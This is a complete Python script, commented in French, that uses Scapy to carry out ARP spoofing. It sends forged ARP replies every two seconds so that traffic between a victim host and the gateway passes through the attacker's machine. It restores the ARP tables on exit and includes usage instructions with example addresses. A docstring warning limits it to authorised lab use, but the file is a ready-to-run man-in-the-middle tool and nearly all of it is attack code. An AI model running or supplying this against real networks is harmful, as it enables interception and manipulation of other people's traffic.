#!/usr/bin/env python3 

""" 

ARP Spoofing / MITM avec Scapy 

Redirige le trafic entre une victime et une passerelle via la machine attaquante 

 

ATTENTION : À utiliser UNIQUEMENT dans un environnement de lab isolé et autorisé. 

""" 

from scapy.all import * 

import sys 

import time 

import signal 

 

conf.verb = 0 

 

# Variables globales pour le nettoyage 

victime_ip = None 

passerelle_ip = None 

interface = None 

 

def get_mac(ip): 

    """Résout l'adresse MAC d'une IP via requête ARP""" 

    arp_request = ARP(pdst=ip) 

    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 

    packet = broadcast / arp_request 

    reponse = srp(packet, timeout=2, iface=interface) 

 

    if reponse[0]: 

        return reponse[0][0][1].hwsrc 

    return None 

 

def arp_spoof(victime_ip, passerelle_ip, interface): 

    """ 

    Envoie des ARP Reply falsifiés : 

    - À la victime : "je suis la passerelle" 

    - À la passerelle : "je suis la victime" 

    """ 

    # Récupérer les adresses MAC 

    mac_victime = get_mac(victime_ip) 

    mac_passerelle = get_mac(passerelle_ip) 

    mac_attaquant = get_if_hwaddr(interface) 

 

    if not mac_victime: 

        print(f"[!] Impossible de résoudre la MAC de {victime_ip}") 

        return False 

    if not mac_passerelle: 

        print(f"[!] Impossible de résoudre la MAC de {passerelle_ip}") 

        return False 

 

    print(f"[*] Victime   : {victime_ip} ({mac_victime})") 

    print(f"[*] Passerelle : {passerelle_ip} ({mac_passerelle})") 

    print(f"[*] Attaquant : ({mac_attaquant})") 

    print(f"[*] Interface : {interface}") 

    print("-" * 55) 

    print(f"[*] Démarrage du spoofing ARP... (Ctrl+C pour arrêter)") 

    print("-" * 55) 

 

    try: 

        while True: 

            # ARP Reply à la victime : "la passerelle est à mon adresse MAC" 

            packet_victime = ARP( 

                op=2,           # ARP Reply 

                pdst=victime_ip, 

                hwdst=mac_victime, 

                psrc=passerelle_ip,  # On prétend être la passerelle 

                hwsrc=mac_attaquant   # Mais avec notre MAC 

            ) 

            send(packet_victime, iface=interface) 

 

            # ARP Reply à la passerelle : "la victime est à mon adresse MAC" 

            packet_passerelle = ARP( 

                op=2, 

                pdst=passerelle_ip, 

                hwdst=mac_passerelle, 

                psrc=victime_ip,   # On prétend être la victime 

                hwsrc=mac_attaquant  # Mais avec notre MAC 

            ) 

            send(packet_passerelle, iface=interface) 

 

            time.sleep(2)  # Envoi toutes les 2 secondes 

 

    except KeyboardInterrupt: 

        print("\n[!] Arrêt demandé...") 

        restaurer_arp(victime_ip, passerelle_ip, mac_victime, mac_passerelle, interface) 

 

    return True 

 

def restaurer_arp(victime_ip, passerelle_ip, mac_victime, mac_passerelle, interface): 

    """Restaure les tables ARP en envoyant les vraies correspondances""" 

    print("[*] Restauration des tables ARP...") 

 

    # Plusieurs envois pour s'assurer de la mise à jour 

    for _ in range(5): 

        # Restaurer la victime 

        packet_v = ARP( 

            op=2, 

            pdst=victime_ip, 

            hwdst=mac_victime, 

            psrc=passerelle_ip, 

            hwsrc=mac_passerelle  # Vraie MAC de la passerelle 

        ) 

        send(packet_v, iface=interface) 

 

        # Restaurer la passerelle 

        packet_p = ARP( 

            op=2, 

            pdst=passerelle_ip, 

            hwdst=mac_passerelle, 

            psrc=victime_ip, 

            hwsrc=mac_victime  # Vraie MAC de la victime 

        ) 

        send(packet_p, iface=interface) 

 

        time.sleep(0.5) 

 

    print("[*] Tables ARP restaurées.") 

 

def signal_handler(sig, frame): 

    """Gestion du Ctrl+C""" 

    raise KeyboardInterrupt 

 

if __name__ == "__main__": 

    signal.signal(signal.SIGINT, signal_handler) 

 

    if len(sys.argv) < 4: 

        print(f"Usage: sudo python3 {sys.argv[0]} <interface> <IP_victime> <IP_passerelle>") 

        print(f"Exemple: sudo python3 {sys.argv[0]} eth0 192.168.10.175 192.168.10.250") 

        sys.exit(1) 

 

    interface = sys.argv[1] 

    victime_ip = sys.argv[2] 

    passerelle_ip = sys.argv[3] 

 

    arp_spoof(victime_ip, passerelle_ip, interface) 